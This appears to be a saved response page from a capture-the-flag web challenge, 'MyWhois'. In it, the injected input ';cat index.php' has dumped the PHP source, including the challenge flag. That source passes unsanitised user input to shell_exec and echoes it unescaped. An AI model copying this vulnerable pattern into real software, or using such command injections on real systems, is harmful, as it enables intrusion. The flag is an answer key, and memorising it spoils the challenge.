<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>MyWhois</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
  </head>

  <body>

    <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
      <a class="navbar-brand" href="index.php">MyWhois</a>
    </nav>

    <main role="main" class="container">
      <div class="jumbotron">
        <h1>Result: ;cat index.php</h1><br><pre><?php
  
  /*
  ** The flag is:
  ** FCSC{2e3405155d63a7d82f215d17232ea102314509ecbe90d605cf8be26f4639153b}
  */

  ini_set('display_errors', 0);
  ini_set('display_startup_errors', 0);
  error_reporting(0);

  abstract class Command {
    public static function whois($domain) {
        $cmd = "/usr/bin/whois $domain";
        return shell_exec($cmd);
    }
  }
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">

    <title>MyWhois</title>

    <!-- Bootstrap core CSS -->
    <link href="css/bootstrap.min.css" rel="stylesheet">
  </head>

  <body>

    <nav class="navbar navbar-expand-md navbar-dark fixed-top bg-dark">
      <a class="navbar-brand" href="index.php">MyWhois</a>
    </nav>

    <main role="main" class="container">
      <div class="jumbotron">
        <?php
          if(isset($_GET['domain']) && $_GET['domain'] !== ''){
            echo '<h1>Result: ' . $_GET['domain'] . '</h1><br>';
            echo '<pre>';
            echo Command::whois($_GET['domain']);
            echo '</pre>';
          } else {
        ?>
          <h1>MyWhois</h1>
          <p class="lead" style="margin-bottom:0px;">
            You custom whois tool!
          </p>
          <form action="index.php" method="get">
            <div class="row">
              <div class="col-sm">
                <div class="input-group mb-3">
                  <div class="input-group-prepend">
                    <span class="input-group-text" id="head-suffix">Domain</span>
                  </div>
                  <input type="text" class="form-control" placeholder="ssi.gouv.fr" id="domain" name="domain" value="">
                </div>
              </div>
            </div>
            <center>
              <button type="submit" class="btn btn-primary">Whois</button>
            </center>
          </form>
        <?php
          }
        ?>
      </div>
    </main>
  </body>
</html>
</pre>      </div>
    </main>
  </body>
</html>
